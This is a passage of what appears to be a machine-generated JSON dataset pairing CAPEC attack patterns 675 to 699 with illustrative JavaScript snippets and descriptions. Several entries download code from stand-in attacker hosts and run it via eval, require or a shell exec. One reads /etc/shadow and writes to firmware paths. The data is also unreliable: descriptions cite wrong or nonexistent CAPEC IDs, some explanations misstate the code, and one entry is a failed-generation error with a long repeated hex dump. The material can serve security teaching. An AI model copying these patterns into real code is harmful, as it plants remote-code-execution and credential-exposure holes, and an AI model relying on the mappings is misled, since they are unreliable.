        "code_snippet": "const FPGA = require('fpga-library');\n\n// Original FPGA configuration\nlet originalConfig = FPGA.getConfig();\n\n// Malicious function to alter FPGA behavior\nfunction maliciousFunction() {\n  // Injecting malicious code\n  console.log('Malicious function executed');\n  // Potentially harmful operations\n  // ...\n}\n\n// Simulate unauthorized error injection\nfunction injectError() {\n  console.log('Error injected to degrade redundancy');\n  // Degrade system redundancy\n  // ...\n}\n\n// Simulate voltage and clock glitch attack\nfunction glitchAttack() {\n  console.log('Voltage and clock glitch attack initiated');\n  // Bypass security mechanisms\n  // ...\n}\n\n// Reload FPGA configuration with malicious function\nfunction reloadFPGAConfig() {\n  let newConfig = originalConfig;\n  newConfig.maliciousFunction = maliciousFunction;\n  FPGA.setConfig(newConfig);\n  console.log('FPGA configuration reloaded with malicious function');\n}\n\n// Execute the attack\nreloadFPGAConfig();\nmaliciousFunction();\ninjectError();\nglitchAttack();",
        "description": "This JavaScript code snippet simulates the malicious alteration of an FPGA's functionality. It demonstrates how an adversary might reload the FPGA configuration to include a malicious function, representing the main idea of the CAPEC. The code also includes functions to simulate unauthorized error injection and voltage/clock glitch attacks, which are related to the CWEs mentioned. The 'reloadFPGAConfig' function modifies the FPGA configuration to include a 'maliciousFunction', which is then executed along with error injection and glitch attack simulations. This represents the potential vulnerabilities and attacks that can be performed on an FPGA system."
    },
    {
        "capec_id": "675",
        "capec_name": "Retrieve Data from Decommissioned Devices",
        "code_snippet": "class Device {\n  constructor(data) {\n    this.data = data; // Sensitive data stored in cleartext\n  }\n\n  decommission() {\n    // Improper scrubbing of sensitive data\n    this.data = null; // Insufficient data removal\n  }\n}\n\n// Simulate device usage\nlet device = new Device('Sensitive Information');\nconsole.log('Before decommission:', device.data);\ndevice.decommission();\nconsole.log('After decommission:', device.data); // Data might still be recoverable",
        "description": "This JavaScript code snippet demonstrates a scenario where a device containing sensitive information is decommissioned improperly. The 'Device' class stores sensitive data in cleartext. The 'decommission' method attempts to remove this data by setting it to null, which is an insufficient data removal process. This code embodies the main idea of CAPEC-157: 'Retrieve Data from Decommissioned Devices', highlighting the vulnerabilities described in CWEs such as improper scrubbing of sensitive data (CWE-1266), incomplete data removal (CWE-1301), and cleartext storage of sensitive information (CWE-316). The sensitive data might still be recoverable after decommissioning, representing a security risk."
    },
    {
        "capec_id": "676",
        "capec_name": "NoSQL Injection",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst MongoClient = require('mongodb').MongoClient;\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst url = 'mongodb://localhost:27017';\nconst dbName = 'mydatabase';\n\nMongoClient.connect(url, { useNewUrlParser: true, useUnifiedTopology: true }, (err, client) => {\n  if (err) throw err;\n  const db = client.db(dbName);\n\n  app.post('/login', (req, res) => {\n    const username = req.body.username;\n    const password = req.body.password;\n\n    // Vulnerable to NoSQL Injection\n    db.collection('users').findOne({ username: username, password: password }, (err, user) => {\n      if (err) throw err;\n      if (user) {\n        res.send('Login successful');\n      } else {\n        res.send('Login failed');\n      }\n    });\n  });\n\n  app.listen(3000, () => {\n    console.log('Server is running on port 3000');\n  });\n});",
        "description": "This JavaScript code snippet sets up an Express.js server with a MongoDB connection. It includes a '/login' endpoint that takes 'username' and 'password' from the request body and uses them to query the 'users' collection in MongoDB. The query is constructed directly from user input without any validation or sanitization, making it vulnerable to NoSQL Injection attacks. An attacker could manipulate the input to bypass authentication or execute arbitrary commands. This example embodies the main idea of CAPEC-943, CAPEC-1286, and related CWEs by demonstrating improper neutralization and validation of user input in a NoSQL context."
    },
    {
        "capec_id": "677",
        "capec_name": "Server Motherboard Compromise",
        "code_snippet": "const fs = require('fs');\nconst path = '/sys/firmware/memmap';\n\n// CWE-1262: Improper Access Control for Register Interface\nfunction readMemoryMap() {\n  try {\n    const data = fs.readFileSync(path, 'utf8');\n    console.log('Memory Map:', data);\n  } catch (err) {\n    console.error('Error reading memory map:', err);\n  }\n}\n\n// CWE-506: Embedded Malicious Code\nfunction injectMalware() {\n  const maliciousCode = 'console.log(\"Malware executed\");';\n  fs.writeFileSync('/sys/firmware/memmap', maliciousCode, 'utf8');\n  console.log('Malware injected into memory map');\n}\n\n// CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nfunction exposeSensitiveInfo() {\n  try {\n    const sensitiveData = fs.readFileSync('/etc/shadow', 'utf8');\n    console.log('Sensitive Data:', sensitiveData);\n  } catch (err) {\n    console.error('Error accessing sensitive data:', err);\n  }\n}\n\n// Simulate the attack\nreadMemoryMap();\ninjectMalware();\nexposeSensitiveInfo();",
        "description": "This JavaScript code snippet simulates a server motherboard compromise by demonstrating several related CWEs. The `readMemoryMap` function represents CWE-1262 by accessing memory-mapped I/O registers without proper access control. The `injectMalware` function simulates CWE-506 by embedding malicious code into the memory map. Finally, the `exposeSensitiveInfo` function demonstrates CWE-497 by exposing sensitive system information to an unauthorized control sphere. This code embodies the main idea of the CAPEC by showing how malware can be inserted into a server's hardware components to alter its functionality and compromise sensitive information."
    },
    {
        "capec_id": "678",
        "capec_name": "System Build Data Maliciously Altered",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-426: Untrusted Search Path\nconst configPath = process.env.CONFIG_PATH || './config.json';\n\n// CWE-497: Exposure of Sensitive System Information\nif (!fs.existsSync(configPath)) {\n  console.error('Configuration file not found:', configPath);\n  process.exit(1);\n}\n\n// CWE-377: Insecure Temporary File\nconst tempFilePath = path.join('/tmp', 'tempConfig.json');\nfs.copyFileSync(configPath, tempFilePath);\n\n// CWE-209: Generation of Error Message Containing Sensitive Information\ntry {\n  const configData = fs.readFileSync(tempFilePath, 'utf8');\n  const config = JSON.parse(configData);\n  console.log('Configuration loaded:', config);\n} catch (err) {\n  console.error('Error reading configuration:', err.message);\n}\n\n// CWE-913: Improper Control of Dynamically-Managed Code Resources\nconst dynamicConfig = require(tempFilePath);\nconsole.log('Dynamic configuration:', dynamicConfig);",
        "description": "This JavaScript code snippet demonstrates a scenario where the system build data can be maliciously altered. It uses an untrusted search path (CWE-426) to locate a configuration file, potentially exposing sensitive system information (CWE-497) if the file is not found. The code creates an insecure temporary file (CWE-377) to store the configuration data. If an error occurs, it generates an error message that may contain sensitive information (CWE-209). Finally, it improperly controls dynamically-managed code resources (CWE-913) by requiring the temporary configuration file, which could be tampered with. This snippet embodies the main idea of CAPEC-493 by showing how the system build process can be deliberately misconfigured through the alteration of build data."
    },
    {
        "capec_id": "679",
        "capec_name": "Exploitation of Improperly Configured or Implemented Memory Protections",
        "code_snippet": "const memory = new ArrayBuffer(1024); // Simulated memory buffer\nconst view = new DataView(memory);\n\n// Simulate bootloader code in writable memory\nview.setUint8(0, 0x90); // NOP instruction\nview.setUint8(1, 0x90); // NOP instruction\n\n// Simulate improper access control\nfunction executeFromMemory(address) {\n  if (address < 0 || address >= memory.byteLength) {\n    throw new Error('Access violation');\n  }\n  // Simulate execution of code from memory\n  console.log('Executing code at address:', address);\n}\n\n// Vulnerability: Executing code from writable memory\nexecuteFromMemory(0); // This should not be allowed in a secure system\n\n// Simulate overlapping protected and unprotected memory regions\nconst protectedRegionStart = 100;\nconst protectedRegionEnd = 200;\nconst unprotectedRegionStart = 150;\nconst unprotectedRegionEnd = 250;\n\nfunction writeMemory(address, value) {\n  if ((address >= protectedRegionStart && address <= protectedRegionEnd) &&\n      (address < unprotectedRegionStart || address > unprotectedRegionEnd)) {\n    throw new Error('Write access violation');\n  }\n  view.setUint8(address, value);\n}\n\n// Vulnerability: Overlapping regions allow bypassing protection\nwriteMemory(175, 0xFF); // This should not be allowed in a secure system",
        "description": "This JavaScript code snippet simulates a memory buffer and demonstrates vulnerabilities related to improperly configured or implemented memory protections. The code includes a simulated bootloader stored in writable memory, which can be executed, representing CWE-1282 (Assumed-Immutable Data is Stored in Writable Memory). It also shows how overlapping protected and unprotected memory regions can allow unauthorized writes, representing CWE-1260 (Improper Handling of Overlap Between Protected Memory Ranges) and CWE-1316 (Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges). The code highlights the risks of executing code from writable memory and the potential for bypassing memory protection due to overlapping regions."
    },
    {
        "capec_id": "680",
        "capec_name": "Exploitation of Improperly Controlled Registers",
        "code_snippet": "class Register { \n  constructor() { \n    this.lockBit = false; \n    this.data = 0; \n  } \n\n  writeData(value) { \n    if (!this.lockBit) { \n      this.data = value; \n    } else { \n      console.log('Register is locked. Cannot write data.'); \n    } \n  } \n\n  lockRegister() { \n    this.lockBit = true; \n  } \n\n  unlockRegister() { \n    this.lockBit = false; \n  } \n\n  readData() { \n    return this.data; \n  } \n} \n\n// Example usage \nconst reg = new Register(); \nreg.writeData(42); \nconsole.log(reg.readData()); // Outputs: 42 \nreg.lockRegister(); \nreg.writeData(100); // Should not change the data \nconsole.log(reg.readData()); // Outputs: 42 \nreg.unlockRegister(); \nreg.writeData(100); \nconsole.log(reg.readData()); // Outputs: 100",
        "description": "This JavaScript code snippet defines a Register class that simulates a hardware register with a lock bit mechanism. The lock bit is intended to prevent unauthorized modifications to the register's data. However, the class includes methods to lock and unlock the register, which can be exploited to modify the data even after the register is locked. This represents the main idea of the CAPEC, where an adversary can exploit improperly controlled registers. The related CWEs are illustrated by the ability to modify the lock bit (CWE-1231), improper access control (CWE-1262), and the potential for mutable data used in security-sensitive operations (CWE-1283)."
    },
    {
        "capec_id": "681",
        "capec_name": "Exploitation of Improperly Controlled Hardware Security Identifiers",
        "code_snippet": "class SoC {\n  constructor() {\n    this.securityTokens = {};\n  }\n\n  assignToken(entity, token) {\n    // CWE-1259: Improper Restriction of Security Token Assignment\n    this.securityTokens[entity] = token; // No validation or protection\n  }\n\n  performAction(entity, action) {\n    // CWE-1270: Generation of Incorrect Security Tokens\n    const token = this.securityTokens[entity];\n    if (!token) {\n      console.log('Action denied: No security token');\n      return;\n    }\n\n    // CWE-1294: Insecure Security Identifier Mechanism\n    if (token !== 'valid-token') { // Simplistic and insecure check\n      console.log('Action denied: Invalid security token');\n      return;\n    }\n\n    // CWE-1302: Missing Source Identifier in Entity Transactions\n    if (!entity) { // No source identifier check\n      console.log('Action denied: Missing entity identifier');\n      return;\n    }\n\n    console.log(`Action ${action} performed by ${entity}`);\n  }\n}\n\nconst soc = new SoC();\nsoc.assignToken('entity1', 'invalid-token'); // Improper token assignment\nsoc.performAction('entity1', 'read'); // Attempt to perform action with invalid token\nsoc.performAction('', 'write'); // Attempt to perform action with missing entity identifier",
        "description": "This JavaScript code snippet represents a simplified System-on-Chip (SoC) security mechanism that is vulnerable to exploitation due to improper handling of security identifiers. The `assignToken` method demonstrates CWE-1259 by assigning security tokens without proper validation or protection. The `performAction` method checks for security tokens but does so insecurely (CWE-1270 and CWE-1294) and fails to validate the presence of a source identifier (CWE-1302). This code embodies the main idea of CAPEC by showing how missing or incorrectly configured security identifiers can be exploited to perform unauthorized actions."
    },
    {
        "capec_id": "682",
        "capec_name": "Exploitation of Firmware or ROM Code with Unpatchable Vulnerabilities",
        "code_snippet": "class Device {\n  constructor() {\n    this.firmwareVersion = '1.0.0';\n    this.isUpdateable = false; // CWE-1277: Firmware Not Updateable\n  }\n\n  checkForUpdates() {\n    if (!this.isUpdateable) {\n      console.log('This device cannot be updated.');\n      return;\n    }\n    // Simulate checking for updates\n    console.log('Checking for firmware updates...');\n  }\n\n  applyVoltageGlitch() { // CWE-1247: Improper Protection Against Voltage and Clock Glitches\n    console.log('Applying voltage glitch...');\n    // Simulate glitching the device\n    this.firmwareVersion = 'corrupted';\n  }\n}\n\nconst myDevice = new Device();\nmyDevice.checkForUpdates();\nmyDevice.applyVoltageGlitch();\nconsole.log(`Firmware version: ${myDevice.firmwareVersion}`);",
        "description": "This JavaScript code snippet defines a `Device` class that simulates a device with unpatchable firmware (CWE-1277). The `checkForUpdates` method checks if the device can be updated and logs a message if it cannot. The `applyVoltageGlitch` method simulates a voltage glitch attack (CWE-1247), which corrupts the firmware version. This code represents the main idea of CAPEC-Exploitation of Firmware or ROM Code with Unpatchable Vulnerabilities by demonstrating a device that cannot be updated and is susceptible to hardware attacks."
    },
    {
        "capec_id": "690",
        "capec_name": "Metadata Spoofing",
        "code_snippet": "const fetch = require('node-fetch');\n\nasync function downloadAndExecute(url) {\n  try {\n    const response = await fetch(url);\n    if (!response.ok) {\n      throw new Error('Network response was not ok');\n    }\n    const code = await response.text();\n    eval(code); // Dangerous: executing code without integrity check\n  } catch (error) {\n    console.error('Failed to download or execute code:', error);\n  }\n}\n\nconst trustedSource = 'https://trusted-source.com/script.js';\nconst lessTrustedSource = 'https://less-trusted-source.com/script.js';\n\n// Vulnerable: Using a less trusted source\ndownloadAndExecute(lessTrustedSource);",
        "description": "This JavaScript code snippet demonstrates a scenario where a script is downloaded from a less trusted source and executed without performing an integrity check. The `downloadAndExecute` function fetches a script from a given URL and executes it using `eval()`, which is inherently dangerous. The code highlights the vulnerability described in CAPEC- Metadata Spoofing, where an adversary could alter the metadata to present a malicious resource as legitimate. The related CWEs are represented as follows: CWE-494 (Download of Code Without Integrity Check) is shown by the lack of verification of the downloaded script's integrity, CWE-348 (Use of Less Trusted Source) is demonstrated by choosing a less trusted source for the script, and CWE-290 (Authentication Bypass by Spoofing) is implied by the potential for spoofing attacks due to the lack of proper verification."
    },
    {
        "capec_id": "691",
        "capec_name": "Spoof Open-Source Software Metadata",
        "code_snippet": "const https = require('https');\nconst fs = require('fs');\n\nconst url = 'https://untrusted-source.com/malicious-package.tar.gz';\nconst filePath = '/tmp/malicious-package.tar.gz';\n\nhttps.get(url, (response) => {\n  if (response.statusCode === 200) {\n    const file = fs.createWriteStream(filePath);\n    response.pipe(file);\n    file.on('finish', () => {\n      file.close(() => {\n        console.log('Downloaded and saved malicious package.');\n        // Execute the downloaded package without integrity check\n        require('child_process').exec(`tar -xzf ${filePath} -C /tmp && node /tmp/malicious-package/index.js`, (err, stdout, stderr) => {\n          if (err) {\n            console.error(`Execution error: ${err}`);\n            return;\n          }\n          console.log(`Output: ${stdout}`);\n        });\n      });\n    });\n  } else {\n    console.error(`Download failed with status code: ${response.statusCode}`);\n  }\n}).on('error', (err) => {\n  console.error(`Error: ${err.message}`);\n});",
        "description": "This JavaScript code snippet demonstrates a scenario where an application downloads and executes a package from an untrusted source without performing any integrity checks. The code uses the 'https' module to download a file from a potentially malicious URL and saves it to a temporary directory. It then extracts and executes the downloaded package using the 'child_process' module. This example embodies the CAPEC 'Spoof Open-Source Software Metadata' by showing how an attacker could spoof metadata to make malicious software appear legitimate. The related CWEs are represented as follows: CWE-494 (Download of Code Without Integrity Check), CWE-348 (Use of Less Trusted Source), CWE-506 (Embedded Malicious Code), and CWE-1395 (Dependency on Vulnerable Third-Party Component)."
    },
    {
        "capec_id": "692",
        "capec_name": "Spoof Version Control System Commit Metadata",
        "code_snippet": "const https = require('https');\nconst fs = require('fs');\n\nconst repoUrl = 'https://malicious-repo.com/repo.git';\nconst localPath = './cloned-repo';\n\n// Function to download and execute code without integrity check (CWE-494)\nfunction downloadAndExecute(url, path) {\n  https.get(url, (res) => {\n    const fileStream = fs.createWriteStream(path);\n    res.pipe(fileStream);\n    fileStream.on('finish', () => {\n      fileStream.close();\n      console.log('Downloaded and saved to', path);\n      // Execute the downloaded code\n      require(path);\n    });\n  }).on('error', (err) => {\n    console.error('Download error:', err);\n  });\n}\n\ndownloadAndExecute(repoUrl, localPath);\n\n// Function to spoof commit metadata (CAPEC-494)\nfunction spoofCommitMetadata() {\n  const fakeMetadata = {\n    author: 'trusted-dev',\n    date: new Date().toISOString(),\n    message: 'Regular update'\n  };\n  console.log('Spoofed commit metadata:', fakeMetadata);\n}\n\nspoofCommitMetadata();\n\n// Exposing repository to unauthorized control sphere (CWE-527)\nfs.writeFileSync('./public-repo/.git/config', 'malicious config data');\nconsole.log('Exposed repository to unauthorized control sphere');",
        "description": "This JavaScript code snippet demonstrates a scenario where an adversary spoofs metadata of a Version Control System (VCS) repository to deceive users. The `downloadAndExecute` function downloads code from a remote repository and executes it without verifying its integrity (CWE-494). The `spoofCommitMetadata` function simulates the spoofing of commit metadata to make the repository appear frequently maintained and from a trusted source. Additionally, the code exposes the repository to an unauthorized control sphere by writing malicious configuration data to the repository's config file (CWE-527). This snippet embodies the main idea of the CAPEC by showing how an attacker can manipulate VCS metadata and repository access to deceive users and introduce malicious code."
    },
    {
        "capec_id": "693",
        "capec_name": "StarJacking",
        "code_snippet": "const https = require('https');\nconst fs = require('fs');\n\n// Vulnerable function to download and execute code without integrity check\nfunction downloadAndExecute(url) {\n  https.get(url, (res) => {\n    let data = '';\n\n    res.on('data', (chunk) => {\n      data += chunk;\n    });\n\n    res.on('end', () => {\n      // Directly execute the downloaded code\n      eval(data);\n    });\n  }).on('error', (err) => {\n    console.error('Error downloading the file:', err.message);\n  });\n}\n\n// URL of the malicious package disguised as a popular one\nconst maliciousUrl = 'https://example.com/popular-package.js';\n\n// Download and execute the malicious code\ndownloadAndExecute(maliciousUrl);",
        "description": "This JavaScript code snippet demonstrates a vulnerable function that downloads and executes code from a given URL without performing any integrity checks. The `downloadAndExecute` function uses the `https` module to fetch a script from a remote location and then directly executes it using `eval`. This embodies the main idea of the CAPEC 'StarJacking', where an adversary spoofs software popularity metadata to deceive users into downloading and executing a malicious package. The code also touches on related CWEs: CWE-494 (Download of Code Without Integrity Check), CWE-506 (Embedded Malicious Code), and CWE-348 (Use of Less Trusted Source). The URL `https://example.com/popular-package.js` represents a malicious package that is falsely presented as a popular and trusted one."
    },
    {
        "capec_id": "694",
        "capec_name": "System Location Discovery",
        "code_snippet": "const http = require('http');\nconst os = require('os');\n\nhttp.createServer((req, res) => {\n  // Collecting system information\n  const systemInfo = {\n    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,\n    language: req.headers['accept-language'],\n    keyboardLayout: 'en-US' // Assuming a default value for simplicity\n  };\n\n  // Exposing sensitive system information\n  res.writeHead(200, {'Content-Type': 'application/json'});\n  res.end(JSON.stringify(systemInfo));\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that collects and exposes sensitive system information such as timezone, language, and keyboard layout. The server listens on port 8080 and responds with the collected information in JSON format. This code embodies the main idea of CAPEC-160 (System Location Discovery) by gathering system-specific details that could be used by an adversary to identify the system's geographical location. The code also touches on related CWEs, such as CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) by exposing sensitive information to unauthorized users, and CWE-360 (Trust of System Event Data) by relying on potentially spoofable data like headers."
    },
    {
        "capec_id": "695",
        "capec_name": "Repo Jacking",
        "code_snippet": "const https = require('https');\nconst fs = require('fs');\n\n// Vulnerable function to download and execute code from a remote repository\nfunction downloadAndExecute(url) {\n  https.get(url, (res) => {\n    let data = '';\n\n    // A chunk of data has been received.\n    res.on('data', (chunk) => {\n      data += chunk;\n    });\n\n    // The whole response has been received. Execute the code.\n    res.on('end', () => {\n      // Write the downloaded code to a file\n      fs.writeFileSync('downloadedCode.js', data);\n\n      // Execute the downloaded code without integrity check\n      require('./downloadedCode.js');\n    });\n  }).on('error', (err) => {\n    console.error('Error downloading the code:', err.message);\n  });\n}\n\n// URL of the repository (potentially hijacked)\nconst repoUrl = 'https://example.com/repo/downloadedCode.js';\n\n// Call the vulnerable function\ndownloadAndExecute(repoUrl);",
        "description": "This JavaScript code snippet demonstrates a vulnerable function that downloads and executes code from a remote repository without performing any integrity checks. The function `downloadAndExecute` fetches JavaScript code from a specified URL, writes it to a local file, and then executes it using `require`. This embodies the main idea of 'Repo Jacking' (CAPEC-494) by potentially allowing an adversary to redirect the repository URL to malicious code. The code also touches on related CWEs: 'Download of Code Without Integrity Check' (CWE-494), 'Inclusion of Functionality from Untrusted Control Sphere' (CWE-829), and 'Untrusted Search Path' (CWE-426)."
    },
    {
        "capec_id": "696",
        "capec_name": "Load Value Injection",
        "code_snippet": "const buffer = new ArrayBuffer(64);\nconst view = new DataView(buffer);\n\n// Simulate adversary-controlled data in microarchitectural buffer\nview.setUint32(0, 0xdeadbeef);\n\ntry {\n  // Induce a page fault by accessing an invalid memory address\n  const invalidMemoryAccess = new Uint8Array(1);\n  invalidMemoryAccess[0] = view.getUint32(0x10000000);\n} catch (e) {\n  // Transient execution may use adversary-controlled data\n  const secret = view.getUint32(0);\n  console.log('Leaked secret:', secret.toString(16));\n}\n\n// Side-channel analysis to discover victim secrets\nfunction sideChannelAnalysis() {\n  const start = performance.now();\n  for (let i = 0; i < 1000000; i++) {\n    // Simulate speculative execution\n    const temp = buffer[i % buffer.byteLength];\n  }\n  const end = performance.now();\n  console.log('Side-channel timing:', end - start);\n}\n\nsideChannelAnalysis();",
        "description": "This JavaScript code snippet simulates a Load Value Injection (LVI) attack by exploiting a hardware design flaw in CPU transient instruction execution. The code sets up an adversary-controlled data buffer and induces a page fault to trigger transient execution. During the transient execution, the adversary-controlled data is accessed, simulating the leakage of sensitive information. The sideChannelAnalysis function represents a side-channel attack to measure timing differences, which can be used to infer secrets from the microarchitectural state. This code embodies the main idea of CAPEC-1342, CAPEC-1423, CAPEC-1422, and CAPEC-1421 by demonstrating how transient execution can expose sensitive information through microarchitectural state manipulation."
    },
    {
        "capec_id": "697",
        "capec_name": "DHCP Spoofing",
        "code_snippet": "User intervention needed!",
        "description": "The model failed to generate a description for this code snippet. Error: Failed to parse CodeSnippet from completion {\"code_snippet\": \"const dgram = require('dgram');\\nconst server = dgram.createSocket('udp4');\\n\\nserver.on('message', (msg, rinfo) => {\\n  const spoofedDHCPResponse = Buffer.from('02010600' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '00000000' + '000000\"}. Got: 1 validation error for CodeSnippet\ndescription\n  field required (type=value_error.missing)"
    },
    {
        "capec_id": "698",
        "capec_name": "Install Malicious Extension",
        "code_snippet": "function installExtension(url) {\n  fetch(url)\n    .then(response => response.text())\n    .then(code => {\n      eval(code); // CWE-494: Download of Code Without Integrity Check\n    })\n    .catch(error => console.error('Failed to install extension:', error));\n}\n\n// Example usage: install a potentially malicious extension\ninstallExtension('http://untrusted-source.com/malicious-extension.js'); // CWE-829: Inclusion of Functionality from Untrusted Control Sphere",
        "description": "This JavaScript code snippet demonstrates the installation of a potentially malicious extension by fetching and executing code from an untrusted source. The `installExtension` function takes a URL as an argument, fetches the code from that URL, and then executes it using `eval()`. This embodies the CAPEC 'Install Malicious Extension' by showing how an adversary could trick a user into installing a malicious extension. The code also highlights several related CWEs: CWE-494 (Download of Code Without Integrity Check) by not verifying the integrity of the fetched code, and CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) by importing executable functionality from an untrusted source."
    },
    {
        "capec_id": "699",
        "capec_name": "Eavesdropping on a Monitor",
